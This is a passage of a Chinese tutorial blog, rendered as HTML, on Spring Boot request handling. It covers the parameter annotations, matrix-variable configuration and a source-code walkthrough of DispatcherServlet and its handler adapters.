<span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.handlerMappings</code>在Debug模式下展现的内容：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005802305.png" alt="在这里插入图片描述"><br>其中，保存了所有<code>@RequestMapping</code> 和<code>handler</code>的映射规则。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005926474.png" alt="在这里插入图片描述"></p><p>所有的请求映射都在HandlerMapping中：</p><ul><li><p>SpringBoot自动配置欢迎页的 WelcomePageHandlerMapping 。访问 &#x2F;能访问到index.html；</p></li><li><p>SpringBoot自动配置了默认 的 RequestMappingHandlerMapping</p></li><li><p>请求进来，挨个尝试所有的HandlerMapping看是否有请求信息。</p><ul><li>如果有就找到这个请求对应的handler</li><li>如果没有就是下一个 HandlerMapping</li></ul></li><li><p>我们需要一些自定义的映射处理，我们也可以自己给容器中放<strong>HandlerMapping</strong>。自定义 <strong>HandlerMapping</strong></p></li></ul><hr><p>IDEA快捷键：</p><ul><li>Ctrl + Alt + U : 以UML的类图展现类有哪些继承类，派生类以及实现哪些接口。</li><li>Crtl + Alt + Shift + U : 同上，区别在于上条快捷键结果在新页展现，而本条快捷键结果在弹窗展现。</li><li>Ctrl + H : 以树形方式展现类层次结构图。</li></ul><h2 id="29、请求处理-常用参数注解使用"><a href="#29、请求处理-常用参数注解使用" class="headerlink" title="29、请求处理-常用参数注解使用"></a>29、请求处理-常用参数注解使用</h2><p>注解：</p><ul><li><code>@PathVariable</code> 路径变量</li><li><code>@RequestHeader</code> 获取请求头</li><li><code>@RequestParam</code> 获取请求参数（指问号后的参数，url?a&#x3D;1&amp;b&#x3D;2）</li><li><code>@CookieValue</code> 获取Cookie值</li><li><code>@RequestAttribute</code> 获取request域属性</li><li><code>@RequestBody</code> 获取请求体[POST]</li><li><code>@MatrixVariable</code> 矩阵变量</li><li><code>@ModelAttribute</code></li></ul><p>使用用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterTestController</span> &#123;<br><br><br>    <span class="hljs-comment">//  car/2/owner/zhangsan</span><br>    <span class="hljs-meta">@GetMapping(&quot;/car/&#123;id&#125;/owner/&#123;username&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String,Object&gt; <span class="hljs-title function_">getCar</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@PathVariable(&quot;username&quot;)</span> String name,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@PathVariable</span> Map&lt;String,String&gt; pv,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestHeader(&quot;User-Agent&quot;)</span> String userAgent,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestHeader</span> Map&lt;String,String&gt; header,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam(&quot;age&quot;)</span> Integer age,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam(&quot;inters&quot;)</span> List&lt;String&gt; inters,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam</span> Map&lt;String,String&gt; params,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> String _ga,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> Cookie cookie)</span>&#123;<br><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br><span class="hljs-comment">//        map.put(&quot;id&quot;,id);</span><br><span class="hljs-comment">//        map.put(&quot;name&quot;,name);</span><br><span class="hljs-comment">//        map.put(&quot;pv&quot;,pv);</span><br><span class="hljs-comment">//        map.put(&quot;userAgent&quot;,userAgent);</span><br><span class="hljs-comment">//        map.put(&quot;headers&quot;,header);</span><br>        map.put(<span class="hljs-string">&quot;age&quot;</span>,age);<br>        map.put(<span class="hljs-string">&quot;inters&quot;</span>,inters);<br>        map.put(<span class="hljs-string">&quot;params&quot;</span>,params);<br>        map.put(<span class="hljs-string">&quot;_ga&quot;</span>,_ga);<br>        System.out.println(cookie.getName()+<span class="hljs-string">&quot;===&gt;&quot;</span>+cookie.getValue());<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br><br>    <span class="hljs-meta">@PostMapping(&quot;/save&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">postMethod</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String content)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;content&quot;</span>,content);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="30、请求处理-RequestAttribute"><a href="#30、请求处理-RequestAttribute" class="headerlink" title="30、请求处理-@RequestAttribute"></a>30、请求处理-@RequestAttribute</h2><p>用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;<br><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;成功了...&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">200</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;  <span class="hljs-comment">//转发到  /success请求</span><br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/params&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testParam</span><span class="hljs-params">(Map&lt;String,Object&gt; map,</span><br><span class="hljs-params">                            Model model,</span><br><span class="hljs-params">                            HttpServletRequest request,</span><br><span class="hljs-params">                            HttpServletResponse response)</span>&#123;<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world666&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-string">&quot;hello666&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>,<span class="hljs-string">&quot;HelloWorld&quot;</span>);<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;c1&quot;</span>,<span class="hljs-string">&quot;v1&quot;</span>);<br>        response.addCookie(cookie);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">///&lt;-----------------主角@RequestAttribute在这个方法</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@GetMapping(&quot;/success&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute(value = &quot;msg&quot;,required = false)</span> String msg,</span><br><span class="hljs-params">                       <span class="hljs-meta">@RequestAttribute(value = &quot;code&quot;,required = false)</span>Integer code,</span><br><span class="hljs-params">                       HttpServletRequest request)</span>&#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">msg1</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">world</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;world&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        map.put(<span class="hljs-string">&quot;reqMethod_msg&quot;</span>,msg1);<br>        map.put(<span class="hljs-string">&quot;annotation_msg&quot;</span>,msg);<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>,hello);<br>        map.put(<span class="hljs-string">&quot;world&quot;</span>,world);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>,message);<br><br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="31、请求处理-MatrixVariable与UrlPathHelper"><a href="#31、请求处理-MatrixVariable与UrlPathHelper" class="headerlink" title="31、请求处理-@MatrixVariable与UrlPathHelper"></a>31、请求处理-@MatrixVariable与UrlPathHelper</h2><ol><li><p>语法： 请求路径：<code>/cars/sell;low=34;brand=byd,audi,yd</code></p></li><li><p>SpringBoot默认是禁用了矩阵变量的功能</p><ul><li>手动开启：原理。对于路径的处理。UrlPathHelper的removeSemicolonContent设置为false，让其支持矩阵变量的。</li></ul></li><li><p>矩阵变量<strong>必须</strong>有url路径变量才能被解析</p></li></ol><p><strong>手动开启矩阵变量</strong>：</p><ul><li>实现<code>WebMvcConfigurer</code>接口：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> &#123;<br><br>        <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();<br>        <span class="hljs-comment">// 不移除；后面的内容。矩阵变量功能就可以生效</span><br>        urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>);<br>        configurer.setUrlPathHelper(urlPathHelper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>创建返回<code>WebMvcConfigurer</code>Bean：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span>&#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br>                        <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> &#123;<br>                <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();<br>                <span class="hljs-comment">// 不移除；后面的内容。矩阵变量功能就可以生效</span><br>                urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>);<br>                configurer.setUrlPathHelper(urlPathHelper);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>@MatrixVariable</code>的用例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterTestController</span> &#123;<br><br>    <span class="hljs-comment">///cars/sell;low=34;brand=byd,audi,yd</span><br>    <span class="hljs-meta">@GetMapping(&quot;/cars/&#123;path&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">carsSell</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable(&quot;low&quot;)</span> Integer low,</span><br><span class="hljs-params">                        <span class="hljs-meta">@MatrixVariable(&quot;brand&quot;)</span> List&lt;String&gt; brand,</span><br><span class="hljs-params">                        <span class="hljs-meta">@PathVariable(&quot;path&quot;)</span> String path)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        map.put(<span class="hljs-string">&quot;low&quot;</span>,low);<br>        map.put(<span class="hljs-string">&quot;brand&quot;</span>,brand);<br>        map.put(<span class="hljs-string">&quot;path&quot;</span>,path);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-comment">// /boss/1;age=20/2;age=10</span><br><br>    <span class="hljs-meta">@GetMapping(&quot;/boss/&#123;bossId&#125;/&#123;empId&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">boss</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;,pathVar = &quot;bossId&quot;)</span> Integer bossAge,</span><br><span class="hljs-params">                    <span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;,pathVar = &quot;empId&quot;)</span> Integer empAge)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        map.put(<span class="hljs-string">&quot;bossAge&quot;</span>,bossAge);<br>        map.put(<span class="hljs-string">&quot;empAge&quot;</span>,empAge);<br>        <span class="hljs-keyword">return</span> map;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="32、请求处理-【源码分析】-各种类型参数解析原理"><a href="#32、请求处理-【源码分析】-各种类型参数解析原理" class="headerlink" title="32、请求处理-【源码分析】-各种类型参数解析原理"></a>32、请求处理-【源码分析】-各种类型参数解析原理</h2><p>这要从<code>DispatcherServlet</code>开始说起：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>        <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                processedRequest = checkMultipart(request);<br>                multipartRequestParsed = (processedRequest != request);<br><br>                <span class="hljs-comment">// Determine handler for the current request.</span><br>                mappedHandler = getHandler(processedRequest);<br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                    noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// Determine handler adapter for the current request.</span><br>                <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br>                ...<br></code></pre></td></tr></table></figure><ul><li><code>HandlerMapping</code>中找到能处理请求的<code>Handler</code>（Controller.method()）。</li><li>为当前Handler 找一个适配器 <code>HandlerAdapter</code>，用的最多的是<strong>RequestMappingHandlerAdapter</strong>。</li><li>适配器执行目标方法并确定方法参数的每一个值。</li></ul><h3 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h3><p>默认会加载所有<code>HandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br><br>    <span class="hljs-comment">/** Detect all HandlerAdapters or just expect &quot;handlerAdapter&quot; bean?. */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">detectAllHandlerAdapters</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><br>    ...<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.detectAllHandlerAdapters) &#123;<br>            <span class="hljs-comment">// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.</span><br>            Map&lt;String, HandlerAdapter&gt; matchingBeans =<br>                BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">if</span> (!matchingBeans.isEmpty()) &#123;<br>                <span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(matchingBeans.values());<br>                <span class="hljs-comment">// We keep HandlerAdapters in sorted order.</span><br>                AnnotationAwareOrderComparator.sort(<span class="hljs-built_in">this</span>.handlerAdapters);<br>            &#125;<br>        &#125;<br>     ...<br></code></pre></td></tr></table></figure><p>有这些<code>HandlerAdapter</code>：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010047654.png" alt="在这里插入图片描述"></p><ol start="0"><li><p>支持方法上标注<code>@RequestMapping</code> </p></li><li><p>支持函数式编程的</p></li><li><p>…</p></li><li><p>…</p></li></ol><h3 id="执行目标方法"><a href="#执行目标方法" class="headerlink" title="执行目标方法"></a>执行目标方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <br>        ...<br><br>        <span class="hljs-comment">// Determine handler for the current request.</span><br>        mappedHandler = getHandler(processedRequest);<br>        <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>            noHandlerFound(processedRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Determine handler adapter for the current request.</span><br>        <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>        ...<br><span class="hljs-comment">//本节重点</span><br>        <span class="hljs-comment">// Actually invoke the handler.</span><br>        mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br></code></pre></td></tr></table></figure><p><code>HandlerAdapter</code>接口实现类<code>RequestMappingHandlerAdapter</code>（主要用来处理<code>@RequestMapping</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//AbstractHandlerMethodAdapter类的方法，RequestMappingHandlerAdapter继承AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>    &#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>        <span class="hljs-comment">//handleInternal的核心</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<span class="hljs-comment">//解释看下节</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> mav;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="参数解析器"><a href="#参数解析器" class="headerlink" title="参数解析器"></a>参数解析器</h3><p>确定将要执行的目标方法的每一个参数的值是什么;</p><p>SpringMVC目标方法能写多少种参数类型。取决于<strong>参数解析器argumentResolvers</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                           HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br>        <span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br>        <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>        <span class="hljs-keyword">if</span> 